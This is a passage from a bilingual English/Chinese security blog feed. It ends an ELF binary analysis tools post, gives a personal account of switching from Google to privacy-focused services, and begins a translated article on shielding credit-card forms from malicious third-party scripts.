&lt;h4 id=&quot;elfutils&quot;&gt;elfutils&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/bin/eu-addr2line&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-ar – alternative to ar, to create, manipulate archive files&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-elfcmp&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-elflint – compliance check against gABI and psABI specifications&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-findtextrel – find text relocations&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-ld – combining object and archive files&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-make-debug-archive&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-nm – display symbols from object/executable files&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-objdump – show information of object files&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-ranlib – create index for archives for performance&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-readelf – human-readable display of ELF files&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-size – display size of each section (text, data, bss, etc)&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-stack – show the stack of a running process, or coredump&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-strings – display textual strings (similar to strings utility)&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-strip – strip ELF file from symbol tables&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-unstrip – add symbols and debug information to stripped binary&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Notes: the elfutils package is a great start, as it contains most utilities to perform analysis.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;註: elfutils 包是一個好的開始，因為它包含了最多用來執行分析的功能&lt;/em&gt;&lt;/p&gt;

&lt;h4 id=&quot;elfkickers&quot;&gt;elfkickers&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/bin/ebfc – compiler for &lt;a href=&quot;https://en.wikipedia.org/wiki/Brainfuck&quot;&gt;Brainfuck&lt;/a&gt; programming language&lt;/li&gt;
  &lt;li&gt;/usr/bin/elfls – shows program headers and section headers with flags&lt;/li&gt;
  &lt;li&gt;/usr/bin/elftoc – converts a binary into a C program&lt;/li&gt;
  &lt;li&gt;/usr/bin/infect – tool to inject a dropper, which creates setuid file in /tmp&lt;/li&gt;
  &lt;li&gt;/usr/bin/objres – creates an object from ordinary or binary data&lt;/li&gt;
  &lt;li&gt;/usr/bin/rebind – changes bindings/visibility of symbols in ELF file&lt;/li&gt;
  &lt;li&gt;/usr/bin/sstrip – strips unneeded components from ELF file&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Notes: the author of the ELFKickers package focuses on mainipulation of ELF files, which might be great to learn more when you find malformed ELF binaries.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;註: ELFKickers 的作者專注在操作 ELF 檔岸上，或許對想要學習畸形 ELF 二進位檔有幫助&lt;/em&gt;&lt;/p&gt;

&lt;h4 id=&quot;pax-utils&quot;&gt;pax-utils&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;/usr/bin/dumpelf – dump internal ELF structure&lt;/li&gt;
  &lt;li&gt;/usr/bin/lddtree – like ldd, with levels to show dependencies&lt;/li&gt;
  &lt;li&gt;/usr/bin/pspax – list ELF/PaX information about running processes&lt;/li&gt;
  &lt;li&gt;/usr/bin/scanelf – wide range of information, including PaX details&lt;/li&gt;
  &lt;li&gt;/usr/bin/scanmacho – shows details for Mach-O binaries (Mac OS X)&lt;/li&gt;
  &lt;li&gt;/usr/bin/symtree – displays a leveled output for symbols&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Notes: Several of the utilities in this package can scan recursively in a whole directory. Ideal for mass-analysis of a directory. The forcus of the tools is to gather PaX details. Besides ELF support, some details regarding Mach-O binaries can be extracted as well.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;註: 在這個套裝軟體中數個功能可以遞迴的掃描一整個目錄。用於對一個目錄的大量分析。這個工具聚焦的點在於集合 PaX 細節。除了 ELF 的支援，一些關於 Mach-O 二進位的細節也可以被萃取。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Example outputs&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;範例輸出&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scanelf -a /bin/ps
 TYPE    PAX   PERM ENDIAN STK/REL/PTL TEXTREL RPATH BIND FILE 
ET_EXEC PeMRxS 0755 LE RW- R-- RW-    -      -   LAZY /bin/ps
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;prelink&quot;&gt;prelink&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/bin/execstack – display or change if stack is executable&lt;/li&gt;
  &lt;li&gt;/usr/bin/prelink – remaps/relocates calls in ELF files, to speed up process&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;example--範例&quot;&gt;Example / 範例&lt;/h2&gt;

&lt;p&gt;If you want to create a binary yourself, simply create a small C program, and compile it. Here is an example, which opens /tmp/test.txt, reads the contents into a buffer and displays it. Make usre to create the related /tmp/test.txt file.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果你想要自己創造一個二進位檔，簡單的創建一個小型的 C 程式，並編譯它。這裡是一個範例，可以打開 /tmp/test.txt，將內容讀進一個緩衝區並顯示。記得要確認創建 /tmp/test.txt 檔案。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv)
{
   FILE *fp;
   char buff\[255\];

   fp = fopen(&quot;/tmp/test.txt&quot;, &quot;r&quot;);
   fgets(buff, 255, fp);
   printf(&quot;%s\\n&quot;, buff);
   fclose(fp);

   return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This program can be compiled with: gcc -o test test.c&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這個程式用 &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o test test.c&lt;/code&gt; 來編譯&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;more-sources--更多資料來源&quot;&gt;More sources / 更多資料來源&lt;/h2&gt;

&lt;p&gt;If you like to know more, a good source would be to follow WikiPedias Executable and Linkable Format(ELF) page. Another good in-depth document: ELF_Format and the document authored by Brian Raiter (ELFkikers). For those who love to read sources, have a look at documented ELF structure header file from Apple. And them finally, if you really wnat to know how a binary works, test it with a disassembler tool like Hopper for Linux.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果你傾向於知道更多，一個好的來源包括維基百科 &lt;a href=&quot;https://en.wikipedia.org/wiki/Executable_and_Linkable_Format&quot;&gt;Executable and Linkable Format (ELF)&lt;/a&gt;頁面。另外一個詳盡的文件:作者與 ELFkickers 相同的著作 &lt;a href=&quot;http://www.skyfree.org/linux/references/ELF_Format.pdf&quot;&gt;ELF Format&lt;/a&gt;。對那些愛上閱讀原始資料，看一看這個從 Apple 的文件 &lt;a href=&quot;http://www.opensource.apple.com/source/dtrace/dtrace-90/sys/elf.h&quot;&gt;ELF structure header file&lt;/a&gt;。最後，如果你真的想要知道一個二進位檔案是如何運作的，使用像是 &lt;a href=&quot;https://www.hopperapp.com/&quot;&gt;Hopper for Linux&lt;/a&gt; 的反組譯工具來做測試。&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="Linux" /><category term="ELF" /><summary type="html">The 101 of ELF Binaries on Linux: Understanding and Analysis</summary></entry><entry><title type="html">珍惜隱私遠離 Google</title><link href="https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind.html" rel="alternate" type="text/html" title="珍惜隱私遠離 Google" /><published>2018-03-08T00:00:00+08:00</published><updated>2018-03-08T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind.html">&lt;h1 id=&quot;taking-privacy-seriously-leaving-google-behind&quot;&gt;Taking privacy seriously leaving google behind&lt;/h1&gt;

&lt;p&gt;Recently, I made the decision to become a little more seucure on the internet. I don’t have much to hide except maybe bank account info, but I was struck by a Glenn Greenwald quote from a TED Talk he gave about privacy.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;最近，我做了成為一個在網際網路上多多一點安全的決定。除了我的銀行帳戶資訊我沒有什麼好隱藏的，但我被 Gleen Greenwald 在 TED 有關隱私的演講給打擊了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Over the last 16 months, as I’ve debated this issue around the world, every single time somebody has said to me, “I don’t really worry about invasions of privacy because I don’t have anything to hide.” I always say the same thing to them. I get out a pen, I write down my email address. I say, “Here’s my email address. What I want you to do when you get home is email me the passwords to all of your email accounts, not jsut the nice, respectable work one in your name, but all of them, because I want to be able to just troll through what it is your’re doing online, read what I want to read and publish whatever I find interesting. After all, if you’re not a bad person, if you’re doing nothing wrong, you should have nothing to hide.” Not a single person has taken me up on that offer.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;過去的16個月，我跟全世界辯論這個議題，當每次某個人對我說 “我並不擔心隱私權的侵犯，我並沒有甚麼東西好隱藏的。” 我總是對他們說一同樣的話。我拿出一枝筆，寫下我的電子郵件地址，並且對他們說 “這是我的電子郵件地址。我要你做的是，當你回到家就把你所有的電子郵件帳戶密碼寄給我，不只是要工作用漂漂亮亮的那個，而是要全部。因為我要能搜索你在網路上做的事情，知道且公布任何我想要知道的有趣事情。畢竟，如果你不是一個壞人，如果你沒有做任何不對的事情，你應該沒什麼好隱藏的。” 沒有一個人肯接受我的提議。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I find myself tired of knowing Google is going through the content of my emails and examining my searches to sell me things.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我發現自己已經厭倦於知道 Google 從頭到尾瀏覽我的電子郵件內容，並檢查我的搜尋紀錄，為的是賣東西給我。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I also know our new goverment (not that our old was too much better) is tracking the activities of anyone who is anti-fascist. I don’t trust them to follow the laws that would otherwise keep me secure from illegal search.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我也知道我們的新政府(我們的舊政府並沒有好一點)正在追蹤任何反法西斯分子的活動情形。我不相信只要遵守法律便能使我安全的遠離非法搜索。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So I set out to become more private and that meant leaving Google products and using encrypted, more secure alternatives.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以打算變得更有隱私，那就表示遠離 Google 產品並且使用加密與更安全的替代方案。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So what I have I found ? Well, I have spent the last weeks and months testing products and making decisions on what I would do.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以我發現了甚麼 ? 哎呀，我費了數個月直到上個星期，都在測試產品並決定我開怎麼做。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here is what I found.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這是我的發現。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Browser:&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;瀏覽器:&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The first, maybe the easiest step was changing my browser away from Google’s Chrome browser. I decided to go with Firefox’s nightly builds because they seem to run faster and feel a bit more Chrome like, so the switch wouldn’t be so shocking. With Firefox account syncing options, it wasn’t hard to get my bookmarks synced across a few devices with ease.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;首先，或許最簡單的步驟是換掉我的 Google Chrome 瀏覽器。我決定使用 Firefox 的 nightly，因為它們似乎運行得更快而且感覺跟 Chrome 很像，所以移轉比較沒有障礙。用 Firefox 帳戶同步選項，自在的跨數個裝置同步我的書籤並不難。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I also installed some plugins, thanks to recommendations from PrivacyTools.io, a site you should frequent for tips on internet privacy. I am now running Ublock Origin to block ads and trackers along with Privacy Badger and HTTPS Everywhere.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我也安裝的了一些插件，感謝 PrivacyTools.io 的建議，一個你應該常常造訪的網站，獲取一些網路隱私的小技巧。我現正使用 Ublock Origin 來阻擋廣告與追蹤和 Privacy Badger 與 HTTPS Everywhere。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Alternatively, I run Tor Browser, a Firefox fork if I want an even greater layer of privacy.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;或者，我使用 Tor 瀏覽器，一個 Firefox 分支，如果想要更安全的隱私層級的話。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Search:&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;搜尋:&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Who doesn’t use Google to find things? Sure, we all know that weird friend who users Yahoo still, or that one guy who still owns a Zune who uses Bing, but Google has it all.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;誰不使用 Google 來找尋事物? 當然，我們都有那種仍使用 Yahoo 的奇怪朋友，或是那個還擁有一台 Zune(編按: 微軟公司出品的可攜式媒體撥放器) 並使用 Bing 的人，但 Google 擁有一切。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I started with the always popular DuckDuckGo, but I found I didn’t get very good search results and it seemed to load really slow for me. Thankfully, thanks to PrivacyTools, I discovered &lt;a href=&quot;https://www.startpage.com/&quot;&gt;StartPage&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我一開始使用很夯的 DuckDuckGo，但我發現我不能得到很好的搜尋結果而且它貌似對我來說載入的頗為龜速，謝天謝地，感謝 PrivacyTools，我偶然發現 &lt;a href=&quot;https://www.startpage.com/&quot;&gt;StartPage&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;StartPage anonymiszes your searches through Google, so you will still get the quality Google results without them seeing you, and without the ads, It easily integrates right into Firefox on desktop and mobile.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;StartPage 匿名化你的 Google 搜尋，所以你將仍然可以獲得有品質的 Google 結果而不備他們看見，還沒有廣告，它簡易的整合進了 Firefox 桌面板與移動版。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;VPN:&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;VPN:&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;When it came to choosing a VPN, I went through many trials. I asked for recommendations and started with the most poular, Private Internet Access, but I didn’t like that they were based in the US, but also found their speeds not all that great. Next I tried NordVPN. The speeds were actually greate on my iPhone, but they don’t offer a native Linux app setting up their different servers was kind of pain.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;當我來到要選擇一個 VPN 時，我嘗試了好幾個實驗。我尋求了建議並從人氣最旺的開始，Private Internet Access(編按:一個匿名的私人 VPN 服務)，但我不喜歡它位在美國，但也因為他們的速度不是很理想。下一個我試了 NordVPN。在我的 iPhone 上速度不錯，但他們沒有原生 Linux 應用程式設定他們不同的伺服器是一大痛點。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Finally, I settled on one was recommended a few times, Mullvad. The price is good ($5/mo), and the speeds are wonderful. I use OpenVPN on my phone, but for my laptop running Linux Mint, and for my media server at home, and old Mac, they offer a native app which makes connecting easy.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;最後，我決定用被建議過數次的，&lt;a href=&quot;https://www.mullvad.net/&quot;&gt;Mullvad&lt;/a&gt;。價錢不錯 ($5/mo)，而且速度卓越。在手機上我使用 OpenVPN，還有我運行 Linux Mint 的筆記型電腦，還有我在家裡的數位媒體伺服器，跟舊 Mac，他們提供了原生應用程式可以很簡單的連接起來。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I also have a free VPN account with &lt;a href=&quot;https://protonvpn.com/&quot;&gt;ProtonVPN&lt;/a&gt;, and another with &lt;a href=&quot;http://www.riseup.net/&quot;&gt;RiseUp&lt;/a&gt;.
These secondary options, which give me okay speeds, allow me backups if shomethings goes wrong with Mullvad.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我還有一個免費的 &lt;a href=&quot;https://protonvpn.com/&quot;&gt;ProtonVPN&lt;/a&gt; 帳戶，還有另一個 &lt;a href=&quot;http://www.riseup.net/&quot;&gt;RiseUp&lt;/a&gt; 的。這些次要選項，有著還 ok 的速度，在 Mullvad 出甚麼問題的時候可以讓我可以備用。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Communications:&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;通訊:&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;While this wasn’t really part of this move, I wanted to recommend some texting, video and voice calling apps that are amazing. I am loving Wire, a chat app that has both desktop and mobile clients. Also, the very popular Signal app.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;雖然這並不真的是這個行動的一部分，我想要推薦一些令人驚奇的文字、影片與語音通話應用程式。我鍾愛 &lt;a href=&quot;http://www.wire.com/&quot;&gt;Wire&lt;/a&gt;，一個聊天應用程式同時有著桌面與移動客戶端。還有很火紅的應用程式 &lt;a href=&quot;https://signal.org/&quot;&gt;Signal&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;For file sharing, I have installed OnionShare.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我安裝了 OnionShare 來分享檔案。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Email:&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;電子郵件:&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This was the last big piece of the puzzle. I have been on Gmail since they launched the first wave of invites. It’s a wonderful web based interface and a good mobile app. Replacing it wasn’t going to be easy. However, I do own my own domain, and figured it was time to use it.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這是謎題的最後一個巨大的一片拼圖。在 Gmail 發動第一波測試邀請的時候，我就已經在使用了。那是一個美好的基於網頁的介面和一個好的移動裝置應用程式。要想取代它並不簡單。然而，我有擁有自己的域名，該是搞定並使用它的時候了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It came down to two providers for me. ProtonMail, makers of ProtonVPN, and Tutanota. Both offer a great service and allow custom domains on their paid accounts. Proton has a much nicer web and mobile interface, but Tutanota has been showing off its beta platform and it’s looking very promising.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;對我來說最後落在兩個供應商，ProtoMail，ProtonVPN 的製造者和 Tutanota。兩者都提供很棒的服務並且允許付費用戶自訂域名。Proton 有更好的網頁及移動裝置介面，但 Tutanota 正炫耀他們的測試平台，而且那看起來非常的有前途。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here, it really came down to price for me. ProtonMail is $5/mo or $48 a year, while Tutanota is $12 a year.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;到了這個地步，對我來說就剩下價錢之爭了。ProtonMail 是一個月 $5 或一年 $48，Tutanota 則是一年 $12。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Given that Tutanota is open source, and they have a pipeline of amazing products in development, I pulled the trigger and moved my email there.&lt;/p&gt;

&lt;p&gt;考慮到 Tutanota 為開放原始碼，且他們有一個開發中的令人驚嘆的產品管道。我下了決定並將我的電子郵件移到這裡。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;So what’s left?&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;還剩下甚麼?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Well, first, here is what I am still using from Google:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;啊，首先這裡是我仍然使用中的 Google 產品:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Gmail: While I have switched, I have nearly a decade of stuff on Gmail and accounts that still point here and important pepole how have this email address. I will slowly begin to migrate them away and likely end up at the point where I just forward all my mail away from here.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Gmail: 當我移轉後，我有一個將近十年的東西在 Gmail 與帳戶上仍然指向這裡，並且重要的人有這個電子郵件地址。我將緩慢的開始遷移他們，最後結束在將我所有的郵件都轉送離這裡。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Google Photos: They offer free backup of all my iPhone photos. I have more than 10,000 photos here and don’t have a solid replacement in place yet.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Google Photos: 他們提供免費的備份我所有的 iPhone 照片。我在這裡有多過一萬張照片，並且還沒有一個可靠的替代品。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;YouTube: I mean, I can’t escape this one.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Youtube: 我的意思是，我沒辦法離開這個。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Google+: Yeah,it’s still a thing. I use it to share articles I have written. It also improves search results for my work.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Google+: 對，這東西還存在。我使用它來分享我寫的文章。它同時也對我的工作改善了搜結果。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Google Authenticator: I use 2-Step Authentication for as many sites as will allow and most use this app. The only app based alternative to this is Authy, and if you look in the comments, it’s problematic.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Google Authenticator: 我在很多網站使用兩步驟驗證，且多數都與許這個應用程式。唯一的基於應用程式的替代方案是 Authy，而且如果你看向留言，它還是有問題的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Google Maps: Anyone have recommendations on good replacement for this?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Google Maps: 任何人對這個有好的建議替代品嗎?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I also still use Facebook and Twitter which are privacy nightmares of their own.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我也仍在使用隱私夢魘 Facebook 與 Twitter。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I am also still looking for a good Google Docs replacement. I am testing out Dropbox Paper, and I use LibreOffice on Linux, but I’d like something I can use online more. The hunt continues.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我也還在尋找一個好的 Google Docs 替代品。我正在測試 Dropbox Paper，並且我在 Linux 上使用 LibreOffice，但我想要某些可以線上使用的。狩獵仍持續著。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;What are you using? What recommendations do you have as I continue to improve myh privacy journey?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;你正在用甚麼? 對我繼續改善隱私之旅你有什麼建議?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Share in the comments.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在留言分享&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;</content><author><name>jhe</name></author><category term="privacy" /><summary type="html">Taking privacy seriously leaving google behind</summary></entry><entry><title type="html">第2部分：如何阻止我從您的網站收集信用卡號碼和密碼</title><link href="https://security-onigiri.github.io//2018/03/07/2.html" rel="alternate" type="text/html" title="第2部分：如何阻止我從您的網站收集信用卡號碼和密碼" /><published>2018-03-07T00:00:00+08:00</published><updated>2018-03-07T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/07/2</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/07/2.html">&lt;p&gt;我&lt;a href=&quot;https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5&quot;&gt;最近有寫了一篇文章，&lt;/a&gt;描述了我如何散布惡意代碼，以非常難以檢測的方式從數千個網站收集信用卡號和密碼。&lt;/p&gt;

&lt;p&gt;這個帖子所收到的評論讓我充滿喜悅，多數表達了“令人不寒而慄”、“令人不安”和“非常恐怖”等情緒。（就像我在舞池裡得到的讚美一樣）&lt;/p&gt;

&lt;p&gt;在這個後續的文章中，我想停止加深恐懼，並提出一些實際的建議。&lt;/p&gt;

&lt;h3 id=&quot;簡短的版本&quot;&gt;&lt;strong&gt;簡短的版本&lt;/strong&gt;&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;沒有必要嘗試和避免第三方代碼&lt;/li&gt;
  &lt;li&gt;在收集或顯示敏感訊息時，請將此信息擷取到不包含第三方JavaScript的單獨HTML文件中&lt;/li&gt;
  &lt;li&gt;在iframe中顯示此文件&lt;/li&gt;
  &lt;li&gt;從另一個域上的靜態文件服務器上提供文件&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;您也可以考慮完全避免使用第三方登錄和使用第三方程式(插件)來收集和處理信用卡訊息等敏感數據。&lt;/p&gt;

&lt;p&gt;我在這篇文章中提出的建議只適用於敏感訊息（密碼、信用卡號碼等）非常有限且可以被封鎖的網站。如果您在聊天應用程式、電子郵件客戶端或GUI數據庫上工作，那麼&lt;strong&gt;一切&lt;/strong&gt;都可能敏感，我無計可施。&lt;/p&gt;

&lt;h3 id=&quot;十八倍的版本&quot;&gt;&lt;strong&gt;十八倍的版本&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;我認為居安思危是一個好的開始。&lt;/p&gt;

&lt;p&gt;我建議您思考一下，OnePlus &lt;a href=&quot;https://forums.oneplus.net/threads/jan-19-update-an-update-on-credit-card-security.752415/&quot;&gt;最近宣布&lt;/a&gt;：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;…一個惡意的腳本被注入到支付頁面代碼中，以便在進入時嗅探信用卡信息…惡意腳本間歇性地操作，直接從用戶的瀏覽器捕獲和發送數據… oneplus.net上的多達4萬個用戶可能受到影響由事件&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;慘。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;現在讓我們把這種模糊的恐懼感變成更具體的東西吧。&lt;/p&gt;

&lt;p&gt;也許給一個場景描述是更為有用的…&lt;/p&gt;

&lt;p&gt;我們想像&lt;strong&gt;第三方代碼&lt;/strong&gt;是一個大杜賓。牠看起來很平靜 溫柔，均勻。但是在牠黑暗且毫無感情的眼睛裡，卻有著未知潛力的閃爍。讓我們只好慶幸我們沒有把我們喜愛的東西放在附近觸動牠。&lt;/p&gt;

&lt;p&gt;現在我把我用戶的&lt;strong&gt;敏感訊息&lt;/strong&gt;描繪成一個可愛且毫無防備的倉鼠。我們看著牠天真地舔著牠的小前腳，梳理著牠那笨拙的小臉，在杜賓犬的尾巴處嬉鬧不已。&lt;/p&gt;

&lt;p&gt;現在，如果你曾經與一個杜賓犬（我強烈推薦它）成為朋友，你可能知道他們是美好、溫柔的生物，並不與他們的惡名相稱。但是，我相信你肯定會同意不該放杜賓犬與一個和狗狗用的咀嚼玩具極其相似的倉鼠單獨相處。&lt;/p&gt;

&lt;p&gt;當然，也許你會下班回家，看到動物方城市中和平相處的可愛場景。或者，也許你會回家會見證倉鼠曾經呼吸的空氣，與一隻像在說“我可以看到甜點菜單嗎？”而把頭朝下的狗&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;我不認為該把來自npm、GTM、DFP或任何其他地方的代碼貼上惡意標籤。但是我建議，除非你能保證這個代碼的行為良好，否則讓它經手你的用戶敏感訊息是對自己的不負責任。&lt;/p&gt;

&lt;p&gt;所以…這是我建議我們都採用的心態：&lt;strong&gt;敏感訊息&lt;/strong&gt;和&lt;strong&gt;第三方代碼&lt;/strong&gt;應該隔離而不放在一起。&lt;/p&gt;

&lt;h4 id=&quot;例如修復易受攻擊的網站&quot;&gt;&lt;strong&gt;例如：修復易受攻擊的網站&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;這個例子中的網站有一個常見的信用卡表格，它很容易受到惡意的第三方代碼的侵害，就像在那幾個非常大的電子商務網站上的那樣，你可能認為這些大網站的安全性更好。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/1000/1*GgGOpt0c8n3tzkdddFJ2ew.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;好的，我知道，我的程式之路耽誤了我的設計天份。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ezxNzJl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以這個頁面&lt;strong&gt;充滿&lt;/strong&gt;了第三方代碼。它使用React，並且使用Create React App創建，所以在我開始做些甚麼之前它就先塞了我886 npm封包（認真）。&lt;/p&gt;

